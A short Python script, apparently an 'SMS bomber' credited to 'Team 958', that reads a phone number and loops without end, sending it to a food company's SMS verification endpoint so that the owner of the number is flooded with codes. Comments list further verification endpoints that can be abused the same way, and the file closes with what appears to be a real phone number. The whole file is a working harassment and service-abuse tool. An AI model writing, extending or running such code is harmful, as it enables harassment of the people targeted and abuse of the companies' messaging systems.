import requests 
from termcolor import colored
from colorama import init

init()

print(colored("$: T958Script [beta] 1.23 ", "cyan"))
print(colored("$: by Team 958", "cyan"))
print()

global numbers
numbers = input(colored("$: ", "green"))

while True:  

    # user = fake_useragent.UserAgent().random
    # headers = {'user_agent' : user}

    a = requests.post("https://io.bellissimo.uz/api/verify-web",
                    data = {"phone" : numbers},)
    
    # b = requests.get("https://io.bellissimo.uz/api/verify-web")
    print(colored(a, "red"))
    # print(colored(a.url, "blue"))
    # print(colored(b, "magenta"))

# https://api.express24.uz/client/v4/authentication/code

# https://io.bellissimo.uz/api/verify-web


# https://api.vk.com/method/statEvents.addVKIDAnonymously?v=5.207&client_id=

# https://customer.api.delever.uz/v1/customers/phone
# https://customer.api.delever.uz/v1/customers/register

# 998993181619